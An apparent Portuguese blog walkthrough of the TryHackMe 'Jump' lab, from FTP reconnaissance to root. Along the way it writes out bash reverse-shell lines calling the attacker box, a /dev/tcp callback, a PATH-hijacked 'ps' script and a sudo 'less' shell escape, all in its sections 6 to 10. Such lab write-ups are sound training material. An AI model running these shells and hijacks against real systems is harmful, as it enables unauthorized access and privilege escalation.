---
layout: post
title: "Linux Jump - Do Recon ao Root: FTP, Reverse Shell e PrivEsc"
description: "Walkthrough da room Jump do TryHackMe: metodologia de reconhecimento, validação de hipóteses, execução de scripts via FTP, enumeração Linux, PATH Hijacking e escalação até root."
date: 2026-10-13
categories: [walkthrough]
tags: [linux, tryhackme, jump, recon, nmap, metasploit, ftp, reverse-shell, privilege-escalation, path-hijacking, sudo]
---

# Jump - Do Recon ao Root: FTP, Reverse Shell e PrivEsc

## 1. Objetivo e metodologia

A room **Jump** apresenta uma cadeia de permissões mal configuradas em um servidor Linux. O desafio não é encontrar um único exploit: é **reconhecer o serviço, provar cada hipótese e enumerar novamente depois de cada acesso**.

~~~text
FTP anônimo
   ↓ upload executado pelo pipeline
recon_user
   ↓ script de backup gravável
dev_user
   ↓ PATH Hijacking no comando ps
monitor_user
   ↓ sudo chama um helper modificável
ops_user
   ↓ Shell Escape no less
root
~~~

> Walkthrough realizado em um laboratório autorizado do TryHackMe. Os endereços IP são os utilizados nesta sessão e podem mudar ao reiniciar a room.

~~~text
Alvo:      10.66.130.182
AttackBox: 10.66.120.132
~~~

Minha maior dificuldade foi **saber o que procurar depois de cada descoberta**. O método que funcionou foi:

1. **Observar:** portas, versões, arquivos, permissões, processos.
2. **Formular uma hipótese:** “esse diretório aceita upload?”, “alguém executa este script?”.
3. **Testar com evidência:** resposta do protocolo, arquivo de saída, callback ou identidade da nova shell.
4. **Confirmar o impacto:** <code>whoami</code>, <code>id</code>, leitura da flag e nova enumeração.

Não confundir **possibilidade**, **teste enviado** e **execução confirmada**.

---

## 2. Recon inicial: qual ferramenta usar e o que procurar?

Comecei pelo Metasploit, usando o Nmap integrado:

~~~bash
msfconsole
workspace -a thm
db_status
db_nmap -sV -O 10.66.130.182
services
~~~

O primeiro resultado mostrou:

~~~text
21/tcp  ftp  vsftpd 3.0.5
22/tcp  ssh  OpenSSH 9.6p1 Ubuntu
~~~

**Erro importante:** sem <code>-p-</code>, o Nmap normalmente verifica apenas as 1.000 portas TCP mais comuns. Também executei o scanner TCP do Metasploit até a porta 10000; isso não é uma varredura completa.

Para descobrir todos os serviços TCP, prefira:

~~~bash
db_nmap -sS -Pn -p- --open 10.66.130.182
~~~

E depois enumere detalhadamente as portas relevantes:

~~~bash
db_nmap -sV -sC -Pn -p21,22 10.66.130.182
~~~

### O que procurar no resultado?

| Descoberta | Próxima ação |
|---|---|
| Porta aberta | Identificar serviço e versão |
| FTP | Testar login anônimo, listar diretórios, ler arquivos e conferir escrita |
| SSH | Verificar versão, configuração e se já existem credenciais úteis |
| HTTP | Inspecionar páginas, respostas, diretórios, métodos e parâmetros |
| Porta incomum | Verificar se é um serviço persistente ou porta temporária |
| CVE ou módulo de exploit | Confirmar versão afetada **e** pré-requisitos antes de testar |

**Outro erro que cometi:** a porta <code>25318</code> apareceu aberta uma vez, mas logo estava fechada. O FTP em modo passivo usa portas altas temporárias para transferência de dados; uma porta passageira não prova a existência de outro serviço.

### Metasploit: recon não é exploit

Usei:

~~~bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.66.130.182
set PORTS 1-10000
set THREADS 20
run
~~~

Também pesquisei:

~~~bash
search vsftpd
vulns
~~~

O Metasploit mostrou um módulo para o **backdoor do vsftpd 2.3.4**, mas meu alvo usava **vsftpd 3.0.5**. Não fazia sentido executar um exploit para outra versão.

A entrada <code>CVE-1999-0497</code> em <code>vulns</code> registrava o **FTP anônimo habilitado**, não uma prova de execução remota de comandos. O “SSH Version Scanner” também era uma descoberta de reconhecimento, não uma shell pronta.

**Regra:** não escolha um exploit porque o nome do serviço coincide. Primeiro verifique versão, requisito, configuração e evidência.

---

## 3. Enumeração do FTP

O módulo correto no meu Metasploit era:

~~~bash
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS 10.66.130.182
run
~~~

Resultado:

~~~text
[+] Anonymous Read-only access ()
~~~

Conectei manualmente:

~~~bash
ftp 10.66.130.182
~~~

~~~text
Name: anonymous
Password: anonymous
~~~

Dentro do FTP:

~~~text
pwd
ls -la
cd pub
ls -la
get README.txt
~~~

Diretórios encontrados:

~~~text
/incoming
/pub
/pub/archive
/pub/uploads
~~~

O arquivo tinha nome <code>README.txt</code>. Minha tentativa inicial com <code>get readme.txt</code> falhou: **Linux diferencia maiúsculas de minúsculas**.

### Baixar tudo que for acessível

Em vez de navegar pasta por pasta, usei <code>lftp</code>:

~~~bash
mkdir -p ftp-dump
lftp -u anonymous,anonymous ftp://10.66.130.182 \
  -e "mirror --verbose --continue / ./ftp-dump; bye"

find ftp-dump -type f -printf '%p\n'
~~~

Resultado: **quatro diretórios e somente um arquivo**, o README. Não havia arquivos adicionais acessíveis nos diretórios vazios.

O README dizia:

~~~text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
~~~

Essa foi a principal pista: **um processo automatizado recebe arquivos em <code>incoming/</code>**.

---

## 4. FTP gravável: não confundir permissão com upload comprovado

Na listagem aparecia:

~~~text
drwxrwxrwx ... incoming
~~~

O Nmap também marcou <code>[NSE: writeable]</code>. Mas o Metasploit havia dito “Read-only”, e minhas primeiras tentativas de <code>put</code> falharam.

**Permissão <code>777</code> no diretório não garante que o protocolo FTP autorize uploads.** Precisava executar a operação de escrita e observar a resposta real do servidor.

Criei um arquivo pequeno:

~~~bash
echo "teste" > /tmp/probe.txt
~~~

Teste com <code>curl</code>:

~~~bash
curl -v -T /tmp/probe.txt \
  ftp://anonymous:anonymous@10.66.130.182/incoming/probe.txt
~~~

Respostas relevantes:

~~~text
230 Login successful.
250 Directory successfully changed.
STOR probe.txt
150 Ok to send data.
226 Transfer complete.
~~~

**<code>226 Transfer complete</code> confirmou o upload.** Depois consegui fazer o mesmo com o cliente FTP tradicional:

~~~text
ftp 10.66.130.182
cd incoming
put /tmp/probe.txt probe2.txt
ls -la
~~~

Não foi possível determinar exatamente por que as tentativas anteriores falharam. O que ficou comprovado foi que **enviar para <code>/incoming</code> com o nome correto funcionava**.

### Dica para outros serviços HTTP

O mesmo raciocínio vale para testes web: não basta enviar um payload e não receber erro. Compare **código HTTP, tamanho da resposta, conteúdo, redirecionamentos, tempo e efeitos no servidor**. Uma mudança mensurável pode ser o primeiro sinal de que a entrada foi interpretada.

---

## 5. Qual formato o pipeline aceita? Como testar sem ficar no escuro?

Aqui cometi o erro mais importante da room.

Enviei arquivos <code>.txt</code>, <code>.json</code>, <code>.xml</code>, <code>.yaml</code>, <code>.sh</code> e até um <code>.elf</code>. Todos permaneciam no diretório. Isso **não demonstrava** se haviam sido processados.

Meu primeiro teste Shell era:

~~~bash
echo "echo TEST_OK" > /tmp/test.sh
~~~

**O problema:** se um job remoto executasse <code>echo TEST_OK</code>, a saída iria para o ambiente do processo no alvo — não para meu terminal FTP. Eu não tinha como enxergá-la.

### Faça um teste com retorno observável

Uma forma de detectar **execução** de um script Bash é usar um callback simples, antes de tentar uma shell interativa.

Na AttackBox, abra um listener:

~~~bash
nc -lvnp 4445
~~~

Em outro terminal, crie o arquivo:

~~~bash
cat > /tmp/ping.sh <<'EOF'
#!/bin/bash
printf 'EXECUTED: %s\n' "$(id -un)" > /dev/tcp/10.66.120.132/4445
EOF
~~~

Envie-o com um nome novo:

~~~bash
curl -v -T /tmp/ping.sh \
  ftp://anonymous:anonymous@10.66.130.182/incoming/ping.sh
~~~

Se o listener receber <code>EXECUTED: recon_user</code>, temos uma confirmação de que **um arquivo <code>.sh</code> foi executado** e de **qual usuário** o executou. Esse exemplo é um procedimento de validação: no meu teste real, a prova definitiva veio pela reverse shell.

O uso de <code>/dev/tcp/</code> depende do Bash e de conexões de saída permitidas; não receber callback também pode significar bloqueio de rede, e não necessariamente formato inválido.

### Método para identificar formatos

1. Procure documentação, scripts, nomes de jobs, logs e mensagens do serviço.
2. Monte **um arquivo pequeno por hipótese** (por exemplo, Shell, JSON ou YAML), com conteúdo coerente com o formato.
3. Garanta algum resultado visível: callback, resposta, arquivo gerado ou alteração de estado.
4. Envie um teste de cada vez, registrando nome, horário e resposta do upload.
5. Compare diretórios de entrada e saída; não interprete somente “arquivo sumiu” ou “arquivo ficou” como prova de execução.
6. Se um formato apresentar efeito observável, investigue como ele é processado antes de enviar payloads mais complexos.

**Lição:** upload confirmado ≠ processamento confirmado ≠ execução confirmada.

---

## 6. FTP para recon_user: primeira reverse shell

Como o pipeline da room executava scripts Shell enviados para <code>incoming/</code>, criei um script Bash para retornar uma conexão.

Na AttackBox:

~~~bash
cat > /tmp/recon.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.66.120.132/4444 0>&1
EOF
~~~

Em outro terminal, iniciei o listener **antes** do upload:

~~~bash
nc -lvnp 4444
~~~

Enviei o script:

~~~bash
curl -v -T /tmp/recon.sh \
  ftp://anonymous:anonymous@10.66.130.182/incoming/recon.sh
~~~

O listener recebeu uma shell. Confirmei:

~~~bash
whoami
id
hostname
pwd
cat /home/recon_user/flag.txt
~~~

Resultado:

~~~text
uid=1001(recon_user) gid=1001(recon_user)
groups=1001(recon_user),1002(dev_user),1005(devops)
~~~

As mensagens <code>no job control in this shell</code> são comuns em reverse shells sem terminal interativo completo. Elas não significam que a conexão falhou.

### O que olhar PRIMEIRO em toda nova shell?

~~~bash
whoami; id; hostname; pwd
sudo -n -l
ls -la /home
find /opt /usr/local/bin -type f -writable \
  -printf '%M %u:%g %p\n' 2>/dev/null
ps auxww | grep -E 'cron|/opt/|python|backup|health|deploy'
~~~

Confira também, conforme a pista encontrada:

~~~bash
cat /etc/crontab
ls -la /etc/cron.d
systemctl list-timers --all --no-pager
~~~

Se a shell for limitada, prefira comandos curtos e redirecione erros com <code>2>/dev/null</code>. Uma tarefa rápida pode não aparecer no <code>ps</code>; nesse caso, observe repetições ou use <code>pspy</code> em laboratório, se disponível.

**Toda vez que mudar de usuário, repita a enumeração.** As permissões e oportunidades também mudam.

---

## 7. recon_user → dev_user: script de backup modificável

Meu <code>id</code> trouxe a pista:

~~~text
groups=... 1002(dev_user),1005(devops)
~~~

Ou seja, <code>recon_user</code> fazia parte do grupo <code>dev_user</code>. Por isso, já consegui **ler** a flag de <code>/home/dev_user/flag.txt</code> antes de assumir a identidade daquele usuário.

**Ler a flag não significa ter escalado para dev_user.** Para confirmar a etapa era necessário obter <code>uid=1002</code>.

Procurei arquivos graváveis:

~~~bash
find /opt /usr/local/bin -type f -writable \
  -printf '%M %u:%g %p\n' 2>/dev/null
~~~

Encontrei:

~~~text
-rwxrwxr-x dev_user:dev_user /opt/dev/backup.sh
~~~

As permissões <code>rwxrwxr-x</code> permitem escrita para o proprietário **e para o grupo**. Como eu pertencia ao grupo, conseguia alterar o script.

Também foi possível observar o processo sendo executado como <code>dev_user</code>:

~~~text
dev_user ... /bin/bash /opt/dev/backup.sh
~~~

Agora existiam as duas condições necessárias: **arquivo modificável + execução com identidade superior**.

Iniciei outro listener na AttackBox:

~~~bash
nc -lvnp 5556
~~~

Na shell <code>recon_user</code>, preservei o conteúdo existente e acrescentei:

~~~bash
cp /opt/dev/backup.sh /tmp/backup.sh.original

cat >> /opt/dev/backup.sh <<'EOF'

/bin/bash -c 'bash -i >& /dev/tcp/10.66.120.132/5556 0>&1'
EOF
~~~

Quando a automação rodou novamente:

~~~text
whoami  → dev_user
id      → uid=1002(dev_user)
~~~

**Por que <code>>></code> e não <code>></code>?** O primeiro acrescenta conteúdo; o segundo sobrescreve. Preservar as instruções anteriores reduz interferência no serviço.

---

## 8. dev_user → monitor_user: PATH Hijacking

Na nova shell, repeti o reconhecimento. Um arquivo chamou atenção:

~~~text
-rw-rw-r-- dev_user:dev_user /opt/dev/bin/ps
~~~

Era estranho haver um arquivo chamado <code>ps</code> dentro de <code>/opt/dev/bin</code>, já que o comando normal está em <code>/usr/bin/ps</code>.

Verifiquei o serviço:

~~~bash
systemctl cat healthcheck.service
cat /usr/local/bin/healthcheck
~~~

Configuração encontrada:

~~~ini
[Service]
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
~~~

O script fazia:

~~~bash
while true; do
  ps aux | grep -v grep
  sleep 5
done
~~~

**A falha:** o serviço roda como <code>monitor_user</code> e chama apenas <code>ps</code>, sem caminho absoluto. O <code>PATH</code> procura **primeiro** em <code>/opt/dev/bin</code>, onde <code>dev_user</code> controla o arquivo <code>ps</code>.

~~~text
monitor_user executa healthcheck
        ↓ chama "ps"
PATH = /opt/dev/bin : /usr/local/bin : /usr/bin
        ↓ primeiro encontrado
/opt/dev/bin/ps  ← controlado por dev_user
~~~

Meu arquivo <code>ps</code> não tinha o bit de execução (<code>-rw-rw-r--</code>), então, como proprietário, precisei ativá-lo com <code>chmod +x</code>. Ser membro de um grupo com escrita não basta, por si só, para alterar o modo do arquivo.

Na AttackBox:

~~~bash
nc -lvnp 5558
~~~

Na shell <code>dev_user</code>:

~~~bash
cp /opt/dev/bin/ps /tmp/ps.original

cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.66.120.132/5558 0>&1'
exec /usr/bin/ps "$@"
EOF

chmod +x /opt/dev/bin/ps
~~~

A conexão recebida confirmou:

~~~text
whoami  → monitor_user
id      → uid=1003(monitor_user)
~~~

A linha <code>exec /usr/bin/ps "$@"</code> chama o <code>ps</code> real com os argumentos originais após o retorno da shell. Como a reverse shell interativa pode manter o script bloqueado, é importante **restaurar o arquivo original depois de validar a etapa**.

**Lição:** não procure apenas arquivos pertencentes ao grupo <code>devops</code>. Minha busca com <code>-group devops</code> retornou vazio, mas existia um arquivo **do próprio dev_user** que dava acesso ao próximo usuário. Comece com <code>-writable</code>; refine depois.

---

## 9. monitor_user → ops_user: sudo e script auxiliar

Na shell <code>monitor_user</code>, a primeira checagem foi:

~~~bash
sudo -n -l
~~~

Resultado:

~~~text
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
~~~

Isso permite executar **aquele comando específico** como <code>ops_user</code>, sem senha.

Inspecionei antes de executar:

~~~bash
cat /usr/local/bin/deploy.sh
ls -l /opt/app/deploy_helper.sh
cat /opt/app/deploy_helper.sh
~~~

O script autorizado pelo sudo fazia:

~~~bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
~~~

E o helper pertencia a <code>monitor_user</code>:

~~~text
-rwxr-xr-x monitor_user:monitor_user /opt/app/deploy_helper.sh
~~~

**Essa é a vulnerabilidade:** não posso editar o <code>deploy.sh</code> autorizado, mas posso editar o arquivo que **ele executa**. Quando invocado via sudo, o helper roda como <code>ops_user</code>.

Na AttackBox:

~~~bash
nc -lvnp 5559
~~~

Na shell <code>monitor_user</code>:

~~~bash
cp /opt/app/deploy_helper.sh /tmp/deploy_helper.original

cat >> /opt/app/deploy_helper.sh <<'EOF'

/bin/bash -c 'bash -i >& /dev/tcp/10.66.120.132/5559 0>&1'
EOF

sudo -n -u ops_user /usr/local/bin/deploy.sh
~~~

No listener:

~~~text
whoami  → ops_user
id      → uid=1004(ops_user)
~~~

Aqui não havia necessidade de esperar uma tarefa agendada: **o comando sudo era o gatilho**.

---

## 10. ops_user → root: Shell Escape com less

Mais uma nova shell, mais uma enumeração:

~~~bash
whoami
id
sudo -n -l
~~~

A saída mostrou:

~~~text
(root) NOPASSWD: /usr/bin/less
~~~

O <code>less</code> é um visualizador de arquivos, mas permite executar comandos externos por meio de <code>!</code>, quando essa funcionalidade não está desabilitada.

Como eu estava em uma reverse shell, melhorei o terminal:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
~~~

Abri um arquivo com o <code>less</code> autorizado:

~~~bash
sudo -n /usr/bin/less /etc/hosts
~~~

**Dentro do less**, digitei:

~~~text
!/bin/bash
~~~

Depois confirmei:

~~~bash
whoami
id
cat /root/flag.txt
~~~

A evidência de sucesso é <code>uid=0(root)</code>, não apenas o fato de o <code>less</code> ter aberto.

**Lição:** em todo <code>sudo -l</code>, procure programas com capacidade de executar outros comandos. O [GTFOBins](https://gtfobins.github.io/gtfobins/less/) documenta o comportamento do <code>less</code> e de outros binários com *shell escape*.

---

## 11. Checklist que vou usar nas próximas rooms

### Recon remoto

- [ ] Varrer **todas** as portas TCP, não apenas o conjunto padrão.
- [ ] Identificar serviço, versão e configuração em cada porta.
- [ ] Para FTP: testar login, listar, baixar e **validar upload** com resposta <code>226</code>.
- [ ] Para HTTP: comparar código, corpo, tamanho, tempo e redirecionamento das respostas.
- [ ] Ler READMEs, configurações, comentários, nomes de arquivos e pistas da room.
- [ ] Antes de usar um exploit, confirmar versão afetada e condições necessárias.

### Ao descobrir uma possibilidade de execução

- [ ] Qual componente recebe a entrada? Onde ela fica armazenada?
- [ ] **Quem** processa ou executa o arquivo?
- [ ] Qual formato ou estrutura é esperado?
- [ ] Como vou **observar o resultado**? Resposta, log, arquivo gerado, callback?
- [ ] O listener já está aberto antes do gatilho?
- [ ] Upload, processamento e execução foram comprovados **separadamente**?

### Em **toda nova shell**

~~~bash
whoami; id; hostname; pwd
sudo -n -l
ls -la /home
find /opt /usr/local/bin -type f -writable \
  -printf '%M %u:%g %p\n' 2>/dev/null
ps auxww | grep -E 'cron|backup|deploy|health|/opt/'
~~~

Depois, conforme os indícios:

- [ ] Ver grupos e caminhos aos quais eles dão acesso.
- [ ] Ver quem é proprietário dos arquivos e quem pode modificá-los.
- [ ] Ver scripts de cron/systemd e **qual usuário os executa**.
- [ ] Ver comandos chamados sem caminho absoluto e a ordem de <code>PATH</code>.
- [ ] Ver scripts auxiliares chamados por um executável permitido no sudo.
- [ ] Confirmar a nova identidade com <code>id</code>, não somente com a flag.

---

## 12. Tabela rápida de comandos e operadores

| Comando / sintaxe | Para que serve |
|---|---|
| <code>db_nmap -sS -Pn -p- --open IP</code> | SYN scan de todas as portas TCP; mostra abertas |
| <code>db_nmap -sV -sC -p21,22 IP</code> | Detecta versões e executa scripts padrão |
| <code>services</code> / <code>vulns</code> | Consulta serviços e descobertas no banco Metasploit |
| <code>auxiliary/scanner/ftp/ftp_anonymous</code> | Testa login FTP anônimo |
| <code>lftp ... mirror / destino</code> | Baixa diretórios recursivamente |
| <code>curl -v -T arquivo ftp://.../incoming/</code> | Envia arquivo e mostra respostas FTP |
| <code>nc -lvnp PORTA</code> | Aguarda conexões TCP na porta escolhida |
| <code>bash -i</code> | Abre Bash interativo |
| <code>/dev/tcp/IP/PORTA</code> | Abre conexão TCP com redirecionamento do Bash |
| <code>&gt;&amp;</code> / <code>0&gt;&amp;1</code> | Redireciona fluxos de saída/entrada para a conexão |
| <code>cat &gt;&gt; arquivo &lt;&lt;'EOF'</code> | Acrescenta bloco de texto diretamente no terminal |
| <code>find ... -writable -printf '%M %u:%g %p\n'</code> | Lista arquivos graváveis com permissões, dono, grupo e caminho |
| <code>2>/dev/null</code> | Esconde mensagens de erro do comando |
| <code>systemctl cat servico</code> | Inspeciona a configuração do serviço systemd |
| <code>sudo -n -l</code> | Mostra permissões sudo sem pedir senha |
| <code>sudo -n -u usuario comando</code> | Executa comando autorizado como outro usuário |
| <code>chmod +x arquivo</code> | Adiciona permissão de execução |
| <code>exec /usr/bin/ps "$@"</code> | Substitui processo pelo <code>ps</code> real, preservando argumentos |
| <code>!/bin/bash</code> no less | Abre um shell externo a partir do visualizador |

### Dicas para a shell limitada

Para listar somente caminhos sem abrir editor:

~~~bash
find /opt -maxdepth 4 -type f -printf '%p\n' 2>/dev/null
~~~

Para evitar listagens enormes, limite primeiro a pesquisa a <code>/opt</code>, <code>/usr/local/bin</code> e aos diretórios relacionados à pista descoberta. Use <code>cat</code>, <code>head</code>, <code>grep</code> e <code>find</code> antes de recorrer a editores.

Ao terminar os testes, restaure scripts modificados usando as cópias feitas antes das alterações. No caso de <code>/opt/dev/bin/ps</code>, restaure também as permissões originais (<code>664</code>). Isso evita deixar automações quebradas ou listeners reconectando.

---

## 13. Conclusão

A Jump mostrou cinco falhas diferentes, mas o raciocínio para encontrá-las foi sempre o mesmo:

~~~text
Encontrar uma superfície
        ↓
Entender permissões e contexto
        ↓
Identificar quem consome ou executa
        ↓
Criar um teste com resultado observável
        ↓
Confirmar qual usuário executou
        ↓
Repetir a enumeração
~~~

Os pontos que mais precisei corrigir foram **fazer a varredura completa**, **não confiar cegamente no rótulo “Read-only”**, **não confundir arquivo enviado com arquivo executado** e **não parar de enumerar após a primeira flag**.

Mais importante que decorar uma reverse shell é saber responder: **quem executa esse arquivo, com quais privilégios, e qual evidência comprova que meu teste funcionou?**
